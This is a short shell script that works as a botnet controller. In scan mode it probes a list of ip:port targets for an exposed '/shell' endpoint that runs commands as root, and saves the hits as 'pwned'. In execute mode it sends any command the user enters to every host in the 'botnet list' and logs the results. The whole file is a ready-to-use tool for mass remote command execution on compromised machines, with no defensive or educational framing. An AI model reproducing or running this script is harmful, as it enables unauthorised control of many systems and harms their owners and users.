#!/bin/sh

if [ "$1" == "scan" ] 
then
echo "Enter the path of the file containing ip:port list to be scanned"
read path

if [ ! -f $path ]; then
    echo "File not found!"
    exit 0
fi
echo "Your list's path is $path"

while read p; do
var=$(curl -s "http://$p/shell?whoami" -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive')



if [[ $var == *"root"* ]]; then
  echo "$p is pwned"
  echo $p >> jaw_pwned.txt
fi

done <$path

echo "Pwned IPs are saved in jaw_pwned.txt"


elif [ "$1" == "execute" ] 
then

echo "Enter the path of the file containing ip:port botnet list"
read path

if [ ! -f $path ]; then
    echo "File not found!"
    exit 0
fi

echo "Your list's path is $path"


IFS= read -r -p  "Enter the command: " comm

ENCODEDMESSAGE=$(php -r "echo urlencode(\"$comm\");")

while read p; do
var=$(curl -s "http://$p/shell?$ENCODEDMESSAGE" -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive')


echo "$p   $comm "
echo "$var"
echo "$p   $comm " >> jaw_exe.txt
echo "$var" >> jaw_exe.txt
echo "#" >> jaw_exe.txt

done <$path


echo "command results are saved in jaw_exe.txt"

else

  echo "Usage: bash `basename $0` [Action]
 
 Actions:
	 scan		: Scan for vulnerable addresses
	 execute	: Send a command to the botnet"
  exit 0
fi
